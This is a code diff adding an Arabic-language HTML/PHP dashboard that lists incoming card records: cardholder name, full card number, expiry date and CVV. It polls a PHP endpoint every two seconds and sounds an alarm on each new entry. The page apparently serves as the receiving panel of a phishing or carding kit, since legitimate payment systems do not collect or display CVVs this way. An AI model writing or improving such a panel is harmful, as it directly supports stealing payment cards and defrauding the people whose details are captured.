@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>لوحة استلام العمليات الفورية (منبه ذكي)</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f9; margin: 0; padding: 30px; }
+        .dashboard-box { max-width: 1000px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); position: relative; }
+        h2 { color: #2c3e50; border-bottom: 3px solid #e74c3c; padding-bottom: 12px; margin-bottom: 25px; }
+        table { width: 100%; border-collapse: collapse; text-align: right; }
+        th, td { padding: 14px; border: 1px solid #e1e8ed; text-align: center; }
+        th { background-color: #2c3e50; color: white; font-weight: 600; }
+        tr:nth-child(even) { background-color: #f8f9fa; }
+        .badge { background: #edf2f7; color: #2d3748; padding: 5px 10px; border-radius: 4px; font-weight: bold; }
+        .ltr-text { direction: ltr; unicode-bidi: embed; font-weight: bold; color: #2b6cb0; }
+        .live-indicator { float: left; font-size: 14px; color: #2ecc71; font-weight: normal; }
+        
+        /* تأثير إشعار وصول بيانات جديدة */
+        .notification-toast { display: none; background-color: #2ecc71; color: white; padding: 15px 25px; border-radius: 8px; font-weight: bold; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(46, 204, 113, 0.3); text-align: center; font-size: 16px; }
+        
+        /* زر تفعيل الصوت تفرضه المتصفحات الحديثة */
+        .audio-btn { background: #34495e; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; float: left; margin-left: 15px; font-size: 12px; font-weight: bold; }
+        .audio-btn.active { background: #2ecc71; }
+    </style>
+</head>
+<body>
+
+<div class="dashboard-box">
+    <!-- إشعار مرئي يظهر عند استلام عملية جديدة -->
+    <div id="new-data-toast" class="notification-toast">🔔 تم استلام عملية سداد جديدة الآن وتحديث الجدول!</div>
+
+    <h2>
+        📋 لوحة التحكم: العمليات المستلمة 
+        <span class="live-indicator">● تحديث فوري مباشر</span>
+        <button id="enableAudio" class="audio-btn">🔊 اضغط هنا لتفعيل صوت المنبه</button>
+    </h2>
+
+    <!-- تم الإبقاء على ملف الصوت الخاص بك المرفوع في مجلد indexx وحذف الوسم المتكرر الخاطئ -->
+    <audio id="alarm-sound" src="indexx/mixkit-software-interface-back-2575.wav" preload="auto"></audio>
+
+    <table>
+        <thead>
+            <tr>
+                <th>اسم حامل البطاقة</th>
+                <th>رقم البطاقة</th>
+                <th>تاريخ الانتهاء</th>
+                <th>الرمز السري (CVV)</th>
+                <th>وقت الاستلام</th>
+            </tr>
+        </thead>
+        <tbody id="table-body">
+            <?php include('fetch_live_data.php'); ?>
+        </tbody>
+    </table>
+</div>
+
+<script>
+let lastRowCount = 0;
+let isFirstLoad = true;
+let audioEnabled = false;
+
+// تفعيل الصوت بعد تفاعل المستخدم لتخطي قيود حماية المتصفح
+document.getElementById('enableAudio').addEventListener('click', function() {
+    audioEnabled = true;
+    this.innerText = "✅ المنبه الصوتي مفعّل ومستعد";
+    this.classList.add('active');
+    
+    // تشغيل تجريبي صامت لتأكيد السماح بالصوت في الخلفية
+    document.getElementById('alarm-sound').play().then(() => {
+        document.getElementById('alarm-sound').pause();
+    }).catch(e => console.log('خطأ تجربة الصوت:', e));
+});
+
+// دالة الفحص والتحديث الموحدة والمحمية من أخطاء الاستضافة 404
+function checkAndRefreshData() {
+    fetch('./fetch_live_data.php') 
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('الملف غير موجود أو الاستضافة تمنع الوصول');
+        }
+        return response.text();
+    })
+    .then(html => {
+        let parser = new DOMParser();
+        let doc = parser.parseFromString(`<table>${html}</table>`, 'text/html');
+        let currentRowCount = doc.querySelectorAll('tr').length;
+        
+        let hasRealData = !html.includes('لا توجد عمليات مستلمة حتى الآن');
+
+        if (!isFirstLoad && currentRowCount > lastRowCount && hasRealData) {
+            document.getElementById('table-body').innerHTML = html;
+            
+            if (audioEnabled) {
+                let sound = document.getElementById('alarm-sound');
+                sound.currentTime = 0;
+                sound.play().catch(e => console.log('تعذر تشغيل الصوت:', e));
+            }
+
+            let toast = document.getElementById('new-data-toast');
+            toast.style.display = 'block';
+            setTimeout(() => { toast.style.display = 'none'; }, 5000);
+        } else {
+            document.getElementById('table-body').innerHTML = html;
+        }
+
+        lastRowCount = currentRowCount;
+        isFirstLoad = false;
+    })
+    .catch(error => {
+        console.log('حدث خطأ في جلب البيانات:', error);
+    });
+}
+
+// الفحص التلقائي المستمر كل ثانيتين
+setInterval(checkAndRefreshData, 2000);
+</script>
+
+</body>
+</html>
